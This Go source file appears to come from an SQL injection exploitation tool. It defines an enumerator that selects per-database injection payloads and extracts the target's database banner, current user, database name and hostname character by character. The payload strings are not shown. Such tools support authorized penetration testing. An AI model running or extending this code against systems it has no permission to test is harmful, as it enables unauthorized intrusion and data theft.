package enumeration

import (
	"context"
	"fmt"
	"net/http"

	"github.com/SobhanYasami/sqlex/internal/config"
	"github.com/SobhanYasami/sqlex/internal/extract"
	"github.com/SobhanYasami/sqlex/internal/payloads"
	"github.com/SobhanYasami/sqlex/internal/request"
	"github.com/SobhanYasami/sqlex/internal/session"
)

// Enumerator handles common and advanced data extraction.
type Enumerator struct {
	extractor *extract.GhauriExtractor
}

func New(sess *session.Session) *Enumerator {
	return &Enumerator{extractor: extract.New(sess)}
}

// baseEctx builds an ExtractionCtx from engine-level context.
func baseEctx(
	cfg *config.Config,
	rs *config.RunState,
	base *request.HTTPResponse,
	attack01 *request.HTTPResponse,
	headers http.Header,
	param request.Parameter,
	injectionType, vector, vectorType string,
	sessionPath string,
) extract.ExtractionCtx {
	return extract.ExtractionCtx{
		URL:           cfg.URL,
		Data:          cfg.Data,
		Headers:       headers,
		Parameter:     param,
		InjectionType: injectionType,
		Vector:        vector,
		VectorType:    vectorType,
		Base:          base,
		Attack01:      attack01,
		MatchString:   cfg.MatchString,
		NotString:     cfg.NotString,
		Code:          cfg.Code,
		Backend:       rs.GetBackend(),
		IsMultipart:   rs.IsMultipart,
		IsJSON:        rs.IsJSON,
		IsXML:         rs.IsXML,
		TextOnly:      rs.TextOnly,
		SessionPath:   sessionPath,
		TimeSec:       int(cfg.TimeSec.Seconds()),
	}
}

// FetchBanner retrieves the database version banner.
func (e *Enumerator) FetchBanner(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	base, attack01 *request.HTTPResponse,
	headers http.Header,
	param request.Parameter,
	injectionType, vector, vectorType, sessionPath string,
) (extract.PayloadResponse, error) {
	backend := rs.GetBackend()
	pl, ok := payloads.BannerPL[backend]
	if !ok || len(pl) == 0 {
		return extract.PayloadResponse{}, fmt.Errorf("no banner payloads for %s", backend)
	}
	ectx := baseEctx(cfg, rs, base, attack01, headers, param, injectionType, vector, vectorType, sessionPath)
	// queryCheck pass first
	guess, err := e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, pl, "", true)
	if err != nil || !guess.OK {
		return extract.PayloadResponse{OK: false, Error: "no working banner payload"}, nil
	}
	return e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, []string{guess.Payload}, "banner", false)
}

// FetchCurrentUser retrieves the current database user.
func (e *Enumerator) FetchCurrentUser(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	base, attack01 *request.HTTPResponse,
	headers http.Header,
	param request.Parameter,
	injectionType, vector, vectorType, sessionPath string,
) (extract.PayloadResponse, error) {
	backend := rs.GetBackend()
	pl, ok := payloads.CurrentUserPL[backend]
	if !ok || len(pl) == 0 {
		return extract.PayloadResponse{}, fmt.Errorf("no current_user payloads for %s", backend)
	}
	ectx := baseEctx(cfg, rs, base, attack01, headers, param, injectionType, vector, vectorType, sessionPath)
	guess, err := e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, pl, "", true)
	if err != nil || !guess.OK {
		return extract.PayloadResponse{OK: false, Error: "no working current_user payload"}, nil
	}
	return e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, []string{guess.Payload}, "current_user", false)
}

// FetchCurrentDB retrieves the current database name.
func (e *Enumerator) FetchCurrentDB(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	base, attack01 *request.HTTPResponse,
	headers http.Header,
	param request.Parameter,
	injectionType, vector, vectorType, sessionPath string,
) (extract.PayloadResponse, error) {
	backend := rs.GetBackend()
	pl, ok := payloads.CurrentDBPL[backend]
	if !ok || len(pl) == 0 {
		return extract.PayloadResponse{}, fmt.Errorf("no current_db payloads for %s", backend)
	}
	ectx := baseEctx(cfg, rs, base, attack01, headers, param, injectionType, vector, vectorType, sessionPath)
	guess, err := e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, pl, "", true)
	if err != nil || !guess.OK {
		return extract.PayloadResponse{OK: false, Error: "no working current_db payload"}, nil
	}
	return e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, []string{guess.Payload}, "current_db", false)
}

// FetchHostname retrieves the database server hostname.
func (e *Enumerator) FetchHostname(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	base, attack01 *request.HTTPResponse,
	headers http.Header,
	param request.Parameter,
	injectionType, vector, vectorType, sessionPath string,
) (extract.PayloadResponse, error) {
	backend := rs.GetBackend()
	pl, ok := payloads.HostnamePL[backend]
	if !ok || len(pl) == 0 {
		return extract.PayloadResponse{}, fmt.Errorf("no hostname payloads for %s", backend)
	}
	ectx := baseEctx(cfg, rs, base, attack01, headers, param, injectionType, vector, vectorType, sessionPath)
	guess, err := e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, pl, "", true)
	if err != nil || !guess.OK {
		return extract.PayloadResponse{OK: false, Error: "no working hostname payload"}, nil
	}
	return e.extractor.FetchCharacters(ctx, cfg, rs, client, ectx, []string{guess.Payload}, "hostname", false)
}
